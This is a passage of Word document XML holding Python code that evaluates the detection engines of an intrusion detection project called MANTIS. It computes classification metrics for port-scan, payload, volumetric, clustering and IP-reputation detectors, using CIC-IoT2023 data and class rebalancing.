    <w:p w14:paraId="623F0E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ip in benign:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2828F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yt.append("Unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470C2F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yp.append("Blacklisted" if eng.check(ip) else "Unknown")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399504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EA07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 = confusion(yt, yp, "Blacklisted")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411C94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result = {"engine": "Bloom Filter (Reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="006972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"samples": len(loaded) + len(benign),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685670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"indicators_loaded": len(loaded),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571B10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"bit_array_size": size, "hash_count": hashes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4450DF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"saturation": round(eng.saturation(), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DABCD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"theoretical_fp_rate": round(eng.false_positive_rate(), 6),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FAAD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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D89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held_out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324FE6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indicators never inserted must not be recognised</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E45BF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leaked = sum(1 for ip in held_out if eng.check(ip))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D253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result["held_out_indicators"] = len(held_out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D72F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result["held_out_false_hits"] = leaked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51537A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result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA115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B4135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57AD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print_report(results):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7998A1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= ["",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F86E9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"================================================================",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C0D5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  MANTIS Evaluation Report",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BDA0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"================================================================",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CF4A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  " + time.strftime("%Y-%m-%d %H:%M:%S"), ""]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356992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r in results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1B75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cm = r["confusion_matrix"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7256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 += [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33775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"--- %s ---" % r["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049846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Samples         : %d" % r["samples"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E071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True  Positives : %d" % cm["tp"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D71E5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False Positives : %d" % cm["fp"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356EE1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False Negatives : %d" % cm["fn"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DFEA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True  Negatives : %d" % cm["tn"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E431A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Precision       : %.4f" % r["precision"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4C1E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Recall          : %.4f" % r["recall"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7638E9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Specificity     : %.4f" % r.get("specificity", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0064ED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F1              : %.4f" % r["f1"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEE12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Accuracy        : %.4f" % r["accuracy"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A42F4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Balanced Acc.   : %.4f" % r.get("balanced_accuracy", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B205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MCC             : %.4f" % r.get("mcc", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297829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Prevalence      : %.4f (positive-class share of this data)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D157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r.get("prevalence", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572332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No-skill F1     : %.4f (majority-positive guesser scores this)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5E44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r.get("no_skill_f1", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477774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4CB229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r["f1"] &lt;= r.get("no_skill_f1", 0.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A019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L.append("  [!] F1 does NOT beat the no-skill baseline on this "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A271C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"data - read MCC / balanced accuracy instead.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2987E6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L.append("")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA069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cross-engine summary so all engines appear in one comparable table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF55A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len(results) &gt; 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A4D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 += ["--- Summary ---",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677220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  %-34s %9s %8s %8s %8s %8s" % ("Engine", "Precision",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2042CF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"Recall", "F1", "Bal.Acc",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E216A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"MCC"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230C24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"  " + "-" * 78]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E4FC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 in results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C1B6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L.append("  %-34s %9.4f %8.4f %8.4f %8.4f %8.4f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7DA2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% (r["engine"][:34], r["precision"], r["recall"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABD4E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r["f1"], r.get("balanced_accuracy", 0.0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8A45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r.get("mcc", 0.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128B95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L.append("")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEB844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3ED2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L.append("================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A107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text = "\n".join(L)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E322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print(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A588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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A82D5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3ABF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D088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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFE82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argparse.ArgumentParser(prog="mantis-eval",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E9F6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description="evaluate mantis engines")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAD3A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p.add_argument("--knn-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A898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p.add_argument("--payload-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F367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p.add_argument("--zscore-csv", help="csv with pps,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC511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p.add_argument("--cic-zscore-csv",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2BE3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help="CIC-IoT2023 export; evaluates the volumetric engine "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C1E1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"on its Rate/Label columns")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E6C9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p.add_argument("--cic-limit", type=int,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C40F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help="cap rows read from --cic-zscore-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699239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p.add_argument("--cic-benign-ratio", type=float,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ACF6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help="also evaluate --cic-zscore-csv resampled to this "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6AD1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"benign prevalence (e.g. 0.95), testing whether the "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE514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"recall collapse is caused by class imbalance")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5C29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p.add_argument("--kmeans-csv", help="csv with pps,ports,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C17C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p.add_argument("--bloom-csv", help="csv with ip,label")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D15F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p.add_argument("--brain",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604AF7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help="brain json to evaluate against, or 'auto' for the "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FFA6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"newest in data/ (default: seeded engines)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0890A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p.add_argument("--out-json", default="evaluation_results.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F57E5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p.add_argument("--out-txt", default="evaluation_results.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0608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p.add_argument("--zscore-threshold", type=float, default=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347980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p.add_argument("--zscore-window", type=int, default=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3431C2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p.add_argument("--compare", action="store_true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EFF0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help="also evaluate the naive Z-Score baseline for "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FC93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"side-by-side comparison")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C643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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B22EE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1A051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42B5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load_zscore_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2C52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series = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18683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newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720838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407762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(r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F17B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"pps" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5F9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loader.DatasetError(path + ": need pps,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD34A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26DC0F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series.append((int(float(row[h["pps"]])), row[h["label"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633AF1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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675315B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74912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F15B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load_cic_zscore_csv(path, limit=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514407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"""Derive a packets-per-second series from a CIC-IoT2023 flow export.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F3870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8FAC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benchmark ships one row per flow with a `Rate` column (packets per</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D1C5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second observed for that flow) and a `Label` naming the attack class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22930D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Feeding `Rate` to the volumetric engine is how the interim evaluation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7EA7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produced its Z-Score figures, so loading it here keeps the corrected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF203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engine directly comparable against that published baseline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E77D70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813C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One caveat is worth stating plainly, because it bounds what the resulting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F518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metrics mean: flow records are not a true temporal series. Row order is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BF44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order of the export, not wall-clock arrival order, so the engine sees</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB435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sequence of rate observations rather than genuine per-second traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8395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That approximation is acceptable for a like-for-like comparison against</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120B92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interim figure -- both variants see identical input in identical</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610D0A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order -- but it is not a substitute for the live-capture and PCAP replay</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4CA3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evaluations, where ordering is real.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331F1F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C1397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series = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269F1A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newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D49B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37537E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(r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19200F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"rate" not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFEC9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loader.DatasetError(path + ": need Rate,Label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32865D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67B110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0EDB0B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rate = float(row[h["rate"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04420C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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F927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15776C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rate != rate or rate in (float("inf"), float("-inf")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218D7D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  # skip NaN/inf rows rather than poisoning the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C013F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label = (row[h["label"]] or "").strip().upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66FDE8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series.append((int(rate), "Normal" if label == "BENIGN" else "DDoS"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D9A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limit and len(series) &gt;= limit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790049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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1F91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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252A88B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CAF9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C7AA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rebalance_series(series, benign_ratio=0.95, warmup=30, seed=1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD333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"""Rebuild a series at a realistic benign prevalence, benign-first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736F58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B5A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Z-Score detector rests on one assumption: that the bulk of observed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007B2E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traffic is normal, so the running mean approximates normality. The</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10AD30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CIC-IoT2023 export violates that assumption outright -- only ~2.4% of its</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1DD1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rows are BENIGN -- so the learned baseline is an attack-level rate and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160614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almost nothing deviates from it. That is a property of the corpus, not of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024D5A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estimator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C847F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206A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This helper tests that explanation instead of merely asserting it. The</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20961D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majority class is *downsampled* rather than the minority upsampled: every</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F5EF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benign row is used exactly once and attack rows are drawn without</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEEBF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replacement until the stated benign prevalence is reached. Upsampling the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243F07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7,173 benign rows to a 95% majority would require recycling each of them</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210E04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several hundred times, and the resulting duplicate-driven variance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C0F3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collapse would itself distort the standard deviation the estimator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52439D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depends on -- an artefact of the experiment rather than a property of the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0706DB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engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D313B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CCC3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benign warm-up prefix is prepended so a baseline can form, mirroring a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E62E4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sensor started on a quiet network, and the remainder is shuffled so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F026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attacks appear as sporadic bursts within a normal stream. If the recall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F82B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collapse were a defect of the estimator it would persist here, so this is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A249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falsifiable test rather than a flattering resample.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DDDD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E92B9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rng = random.Random(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE6D7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benign = [s for s in series if s[1] == "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF6AB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attack = [s for s in series if s[1] != "Normal"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512D08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benign or not attack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47BED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list(series)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F448C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BDFD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keep = int(len(benign) * (1.0 - benign_ratio) / max(1e-9, benign_ratio))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABCB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keep = max(1, min(len(attack), keep))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255C83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sampled_attack = rng.sample(attack, keep)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69323CF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75966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list(benign[:warmup])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC9E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mixed = list(benign) + sampled_attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C46ED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rng.shuffle(mixed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682276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out.extend(mixed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D33E7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out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B364B8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FC6D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1049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load_kmeans_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEFCB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"""Read pps,ports,label rows for novelty-detection evaluation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5A25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series = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5958A5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newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C845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762F0E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(r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065205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ports_key = "ports" if "ports" in h else "unique_ports"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139851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"pps" not in h or ports_key not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558A31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loader.DatasetError(path + ": need pps,ports,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319DCD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0DDC62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series.append((int(float(row[h["pps"]])),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC02E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int(float(row[h[ports_key]])),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C79B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row[h["label"]]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B14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series</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423C4DE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84BC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340B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load_bloom_csv(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B672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"""Read ip,label rows for reputation-filter evaluation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5AF6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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB7EB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newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DDF4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csv.DictReader(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE9B6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 = {c.lower().strip(): c for c in (r.fieldnames or [])}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1C62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ip_key = "ip" if "ip" in h else "src_ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E03E9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ip_key not in h or "label" not in h:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47230B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loader.DatasetError(path + ": need ip,label cols")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267F1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r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C136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rows.append((row[h[ip_key]].strip(), row[h["label"]].strip()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3346EA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rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428CFE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0EA2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8FCB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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297D11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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1679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 = load_brain(args.brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F506C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[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4D878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556C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args.knn_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003A2E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out.append(evaluate_knn(loader.load_knn_csv(args.knn_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5306D3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args.payload_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DEDB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out.append(evaluate_payload(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B867B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loader.load_payload_csv(args.payload_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01307E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if args.zscore_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6E4E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series = load_zscore_csv(args.zscore_csv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED1B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out.append(evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFF10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args.zscore_window, guard_baseline=True))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2690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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5476C3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out.append(evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B39D0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args.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FE6A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guard_baseline=False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724596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A456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args.cic_zscore_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258AD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series = load_cic_zscore_csv(args.cic_zscore_csv, args.cic_limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598FC9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guarded = evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C308F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args.zscore_window, guard_baseline=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFB47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guarded["engine"] = "Z-Score (CIC-IoT2023)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF0F4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out.append(guarded)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E27C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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD875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naive = evaluate_zscore(series, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3728CE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args.zscore_window, guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33875A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naive["engine"] = "Z-Score (CIC-IoT2023, naive baseline)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A964B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out.append(naive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E543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args.cic_benign_ratio:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5061C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bal = rebalance_series(series, args.cic_benign_ratio,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5291CA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warmup=args.zscore_window)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E232E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pct = int(round(args.cic_benign_ratio * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66ABAD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res = evaluate_zscore(bal, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63357B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args.zscore_window, guard_baseline=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D305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res["engine"] = "Z-Score (CIC-IoT2023, %d%% benign)" % pct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8142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out.append(res)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D016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args.compare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320229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res_n = evaluate_zscore(bal, args.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1807F1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args.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B785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guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327CAF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res_n["engine"] = ("Z-Score (CIC, %d%% benign, naive)" % pct)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746DEB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out.append(res_n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E8D1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B6FE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args.kmeans_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C417A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out.append(evaluate_kmeans(load_kmeans_csv(args.kmeans_csv), brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770975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DF77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args.bloom_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FF68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out.append(evaluate_bloom(load_bloom_csv(args.bloom_csv)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C63DCA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14F9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out:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B8DB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no dataset given. try --help")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBAFA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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033BCE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5E57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text = print_report(out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4642EE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open(args.out_json, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C0D7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json.dump({"generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5124EE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"results": out}, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D41D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open(args.out_txt, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34894A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f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F7F2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print("[+] wrote", args.out_json, "and", args.out_txt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702336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11EB88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DACA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9E0A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9054D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2B83BD2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src/evaluation/benchmark_report.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FB4552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(250 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9F4C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634D8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"""Build a human-readable benchmark + model-comparison report for supervisors."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311983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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACD7B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780F84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065A1F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4A6CC4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9CB44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1C9AF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70B0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load_json(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183C34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open(path, "r", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BC54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json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C13617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8EE9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AA24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fmt_pct(x):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793C5E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"%.2f%%" % (float(x) * 100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFE31D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C9F2C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7353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best_by_f1(results):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524C7B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if not results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2B3E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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FE6D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max(results, key=lambda r: r.get("f1", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBB466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87B5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424D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rank_results(results):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B404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sorted(results, key=lambda r: (-r.get("f1", 0), -r.get("recall", 0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460FB5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BCEE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083E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brain_training_summary(brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714839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lines = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE1E5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"knn" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47311B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 = len(brain["knn"].get("training_data", []))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E8D7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lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8D54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KNN (Port Scan)       | K-Nearest Neighbours | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F068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"CIC-IoT2023 / knn CSV  | %d labelled samples | k=%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EABB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(n, brain["knn"].get("k", 3))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59170E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64A2C5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"payload" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537317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kw = len(brain["payload"].get("likelihoods", {}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0153C6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prior = brain["payload"].get("prior_malicious", "?")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0601E1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lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1137F9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Naive Bayes (Payload) | Multinomial NB       | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6310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"payload_sample.csv     | %d keywords, prior_mal=%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127F30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(kw, prior)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3482AE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14780B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"kmeans" in brain:</w:t>
